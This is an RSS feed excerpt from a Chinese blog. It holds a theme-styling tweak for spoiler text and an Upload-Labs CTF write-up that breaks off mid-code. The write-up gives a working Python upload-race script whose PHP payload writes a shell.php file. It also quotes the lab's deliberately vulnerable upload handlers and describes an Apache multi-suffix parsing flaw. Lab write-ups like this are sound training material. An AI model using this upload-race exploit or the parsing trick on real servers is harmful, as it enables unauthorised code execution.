&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; color: &lt;span style="color:#66d9ef"&gt;lightblue&lt;/span&gt; !important;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; .&lt;span style="color:#a6e22e"&gt;heimu&lt;/span&gt;:&lt;span style="color:#960050;background-color:#1e0010"&gt;hover&lt;/span&gt; .&lt;span style="color:#a6e22e"&gt;new&lt;/span&gt;, .&lt;span style="color:#a6e22e"&gt;heimu&lt;/span&gt; .&lt;span style="color:#a6e22e"&gt;new&lt;/span&gt;:&lt;span style="color:#960050;background-color:#1e0010"&gt;hover&lt;/span&gt;, .&lt;span style="color:#a6e22e"&gt;new&lt;/span&gt;:&lt;span style="color:#960050;background-color:#1e0010"&gt;hover&lt;/span&gt; .&lt;span style="color:#a6e22e"&gt;heimu&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; .&lt;span style="color:#a6e22e"&gt;heimu&lt;/span&gt;:&lt;span style="color:#960050;background-color:#1e0010"&gt;active&lt;/span&gt; .&lt;span style="color:#a6e22e"&gt;new&lt;/span&gt;, .&lt;span style="color:#a6e22e"&gt;heimu&lt;/span&gt; .&lt;span style="color:#a6e22e"&gt;new&lt;/span&gt;:&lt;span style="color:#960050;background-color:#1e0010"&gt;active&lt;/span&gt;, .&lt;span style="color:#a6e22e"&gt;new&lt;/span&gt;:&lt;span style="color:#960050;background-color:#1e0010"&gt;active&lt;/span&gt; .&lt;span style="color:#a6e22e"&gt;heimu&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; color: &lt;span style="color:#ae81ff"&gt;#BA0000&lt;/span&gt; !important;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;因为是&lt;code&gt;.styl&lt;/code&gt;的文件，缩进是很严格的，自行按照前面缩进来整理一下。上面那么多就是兼容了一下黑幕下的超链接、粗体、代码块。主要是超链接。&lt;/p&gt;
&lt;ol start="2"&gt;
&lt;li&gt;在&lt;code&gt;main.js&lt;/code&gt;的&lt;code&gt;unRefreshFn&lt;/code&gt;和&lt;code&gt;refreshFn&lt;/code&gt;方法之前定义&lt;code&gt;addheimuTitle&lt;/code&gt;函数&lt;/li&gt;
&lt;/ol&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-js" data-lang="js"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;//你知道的太多了
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;const&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;addheimuTitle&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt;(){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;console&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;log&lt;/span&gt;(&lt;span style="color:#ae81ff"&gt;123&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;$&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;.heimu&amp;#39;&lt;/span&gt;).&lt;span style="color:#a6e22e"&gt;attr&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;title&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;你知道的太多了&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;可以&lt;code&gt;ctrl+f&lt;/code&gt;搜索上面那两个&lt;code&gt;..refreshFn&lt;/code&gt;函数，发现是整个JS中函数调用的入口，所以我们也需要把自己定义的&lt;code&gt;addheimuTitle&lt;/code&gt;函数在这里面调用。我盲猜的嗷&lt;code&gt;refreshFn&lt;/code&gt;这个函数是在载入页面会调用，直接在里面第二行加上&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201120173713.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;h2 id="修改删除线"&gt;修改删除线
&lt;/h2&gt;&lt;p&gt;​ 修改&lt;code&gt;css\_layout\post.styl&lt;/code&gt;文件，在文件中找到id为&lt;code&gt;#article-container&lt;/code&gt;的元素，这个元素是文章页面中最外层的元素，我们需要在它里面添加&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-stylus" data-lang="stylus"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;#&lt;/span&gt;&lt;span style="color:#f92672"&gt;article&lt;/span&gt;&lt;span style="color:#f92672"&gt;-&lt;/span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;container&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;.....&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;.....&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;del&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; background&lt;span style="color:#f92672"&gt;-&lt;/span&gt;color: &lt;span style="color:#ae81ff"&gt;#252525&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; color: &lt;span style="color:#ae81ff"&gt;#252525&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; text-shadow: &lt;span style="color:#66d9ef"&gt;none&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; text-decoration: &lt;span style="color:#66d9ef"&gt;none&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;&amp;amp;&lt;/span&gt;:&lt;span style="color:#960050;background-color:#1e0010"&gt;hover&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; color: &lt;span style="color:#66d9ef"&gt;white&lt;/span&gt; !important;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;​ 因为文章中的删除线被渲染以后页面的标签为&lt;code&gt;&amp;lt;del&amp;gt;&lt;/code&gt;，选中id为&lt;code&gt;article-container&lt;/code&gt;下的所有&lt;code&gt;del&lt;/code&gt;标签添加样式，剩下的还有在&lt;code&gt;main.js&lt;/code&gt;中添加&lt;code&gt;title&lt;/code&gt;和上面的方法差不多，只需要把选择器修改为&lt;code&gt;$('#article-container del').attr('title','你知道的太多了')&lt;/code&gt;。&lt;/p&gt;
&lt;h2 id="完工"&gt;完工
&lt;/h2&gt;&lt;p&gt;​ 两种方法比较下，第一种方法可以保留删除线，但是在写文章时需要再手打一遍标签，第二种方法直接借用删除线，能省事但是删除线就用不了了。我用的第一种。&lt;/p&gt;</description></item><item><title>Upload-Labs的最后几道题</title><link>https://www.braindance.top/posts/ctf/upload-labs5/</link><pubDate>Thu, 19 Nov 2020 08:47:19 +0000</pubDate><guid>https://www.braindance.top/posts/ctf/upload-labs5/</guid><description>&lt;h2 id="pass-17"&gt;Pass-17
&lt;/h2&gt;&lt;p&gt;​ （windows环境，php版本5.2.17，题号是18题）&lt;/p&gt;
&lt;p&gt;源码：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$is_upload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;null&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_POST[&lt;span style="color:#e6db74"&gt;&amp;#39;submit&amp;#39;&lt;/span&gt;])){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $ext_arr &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;array&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;jpg&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;png&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;gif&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $file_name &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;name&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $temp_file &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;tmp_name&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $file_ext &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;substr&lt;/span&gt;($file_name,&lt;span style="color:#a6e22e"&gt;strrpos&lt;/span&gt;($file_name,&lt;span style="color:#e6db74"&gt;&amp;#34;.&amp;#34;&lt;/span&gt;)&lt;span style="color:#f92672"&gt;+&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $upload_file &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;UPLOAD_PATH&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt; $file_name;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;move_uploaded_file&lt;/span&gt;($temp_file, $upload_file)){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;in_array&lt;/span&gt;($file_ext,$ext_arr)){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $img_path &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;UPLOAD_PATH&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;rand&lt;/span&gt;(&lt;span style="color:#ae81ff"&gt;10&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;99&lt;/span&gt;)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;date&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;YmdHis&amp;#34;&lt;/span&gt;)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;.&amp;#34;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$file_ext;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;rename&lt;/span&gt;($upload_file, $img_path);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $is_upload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;true&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }&lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;只允许上传.jpg|.png|.gif类型文件！&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;unlink&lt;/span&gt;($upload_file);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }&lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;上传出错！&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;​ 思路和前面的一样，获取文件信息，移动文件到&lt;strong&gt;upload&lt;/strong&gt;文件夹，第12行使用了白名单验证，多了第14行的&lt;code&gt;rename&lt;/code&gt;函数，看名称就是重命名的函数，所以我们可以在重命名之前访问我们上传的文件，所以这题用到了&lt;strong&gt;上传竞争&lt;/strong&gt;，使用&lt;code&gt;python&lt;/code&gt;脚本不断的向服务器上传文件，然后访问上传的文件，上传的文件中有一句代码&lt;code&gt;&amp;lt;?php fputs(fopen('shell.php','w'),'&amp;lt;?php phpinfo();?&amp;gt;');?&amp;gt;&lt;/code&gt;这段代码执行以后，会创建一个名为&lt;code&gt;shell.php&lt;/code&gt;里面有一句&lt;code&gt;&amp;lt;?php phpinfo();?&amp;gt;&lt;/code&gt;的文件。&lt;/p&gt;
&lt;p&gt;​ 脚本代码&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#coding=utf-8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; requests
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;from&lt;/span&gt; multiprocessing &lt;span style="color:#f92672"&gt;import&lt;/span&gt; Pool
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;CompeteUpload&lt;/span&gt;(list):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; url&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;http://upload-labs/Pass-18/index.php&amp;#34;&lt;/span&gt; &lt;span style="color:#75715e"&gt;#上传页面&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; geturl&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;http://upload-labs/upload/233.php&amp;#34;&lt;/span&gt; &lt;span style="color:#75715e"&gt;#访问上传文件&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; file&lt;span style="color:#f92672"&gt;=&lt;/span&gt;{&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;:(&lt;span style="color:#e6db74"&gt;&amp;#39;233.php&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;&amp;lt;?php fputs(fopen(&amp;#39;shell.php&amp;#39;,&amp;#39;w&amp;#39;),&amp;#39;&amp;lt;?php phpinfo();?&amp;gt;&amp;#39;);?&amp;gt;&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;image/jpeg&amp;#39;&lt;/span&gt;)}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; data&lt;span style="color:#f92672"&gt;=&lt;/span&gt;{&lt;span style="color:#e6db74"&gt;&amp;#39;submit&amp;#39;&lt;/span&gt;:&lt;span style="color:#e6db74"&gt;&amp;#39;上传&amp;#39;&lt;/span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; r&lt;span style="color:#f92672"&gt;=&lt;/span&gt;requests&lt;span style="color:#f92672"&gt;.&lt;/span&gt;post(url&lt;span style="color:#f92672"&gt;=&lt;/span&gt;url,data&lt;span style="color:#f92672"&gt;=&lt;/span&gt;data,files&lt;span style="color:#f92672"&gt;=&lt;/span&gt;file)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;#print &amp;#34;test upload....&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; r1&lt;span style="color:#f92672"&gt;=&lt;/span&gt;requests&lt;span style="color:#f92672"&gt;.&lt;/span&gt;get(url&lt;span style="color:#f92672"&gt;=&lt;/span&gt;geturl)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; r1&lt;span style="color:#f92672"&gt;.&lt;/span&gt;status_code&lt;span style="color:#f92672"&gt;==&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;200&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print (&lt;span style="color:#e6db74"&gt;&amp;#34;upload success!&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; __name__&lt;span style="color:#f92672"&gt;==&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; pool &lt;span style="color:#f92672"&gt;=&lt;/span&gt; Pool(&lt;span style="color:#ae81ff"&gt;10&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; pool&lt;span style="color:#f92672"&gt;.&lt;/span&gt;map(CompeteUpload, range(&lt;span style="color:#ae81ff"&gt;10000&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; pool&lt;span style="color:#f92672"&gt;.&lt;/span&gt;close()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; pool&lt;span style="color:#f92672"&gt;.&lt;/span&gt;join()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;​ 第一次用python的我在这里知道了&lt;code&gt;pip&lt;/code&gt;。这道题因为要不断的上传和访问文件，所以对在线靶场不友好，所以才选择了本地环境解题。完工&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201119090033.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;h2 id="pass-18失手"&gt;Pass-18（失手）
&lt;/h2&gt;&lt;p&gt;​ 18题失手了没有思路，如果使用&lt;code&gt;include.php&lt;/code&gt;文件包含的话还可以，看了看网上大部分的博客都是敷敷衍衍过去的，找到了一篇稍微有点思路的，使用的是&lt;code&gt;apache2.2.x的解析漏洞&lt;/code&gt;，这个漏洞的思路就是，apache服务器在解析有多个后缀名的文件时，从最后一个开始向前扫描，如果不认识就跳过，直到遇到一个认识的文件后缀，就把这个文件以这个能识别的后缀解析。&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://blog.csdn.net/qq_32434307/article/details/79480316" target="_blank" rel="noopener"
&gt;Apache文件解析漏洞&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://www.cnblogs.com/yuzly/p/11226377.html" target="_blank" rel="noopener"
&gt;apache httpd多后缀解析漏洞复现&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​ 源码中还有一个可以突破的点是同样使用了&lt;strong&gt;重命名函数&lt;/strong&gt;，所以应该还是可以使用竞争上传访问得到，但是使用了白名单验证，我实在是没招了所以&lt;del&gt;先摸为敬&lt;/del&gt;。&lt;/p&gt;
&lt;h2 id="pass-19"&gt;Pass-19
&lt;/h2&gt;&lt;p&gt;（windows环境，php5.2.17，magic_quotes_gpc=Off）&lt;/p&gt;
&lt;p&gt;源码：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$is_upload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;null&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_POST[&lt;span style="color:#e6db74"&gt;&amp;#39;submit&amp;#39;&lt;/span&gt;])) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;file_exists&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;UPLOAD_PATH&lt;/span&gt;)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $deny_ext &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;array&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;php&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;php5&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;php4&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;php3&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;php2&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;html&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;htm&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;phtml&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;pht&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;jsp&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;jspa&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;jspx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;jsw&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;jsv&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;jspf&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;jtml&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;asp&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;aspx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;asa&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;asax&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;ascx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;ashx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;asmx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;cer&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;swf&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;htaccess&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $file_name &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_POST[&lt;span style="color:#e6db74"&gt;&amp;#39;save_name&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $file_ext &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;pathinfo&lt;/span&gt;($file_name,&lt;span style="color:#a6e22e"&gt;PATHINFO_EXTENSION&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;in_array&lt;/span&gt;($file_ext,$deny_ext)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $temp_file &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;tmp_name&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $img_path &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;UPLOAD_PATH&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt;$file_name;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;move_uploaded_file&lt;/span&gt;($temp_file, $img_path)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $is_upload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;true&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }&lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;上传出错！&amp;#39;&lt;/span&gt;;
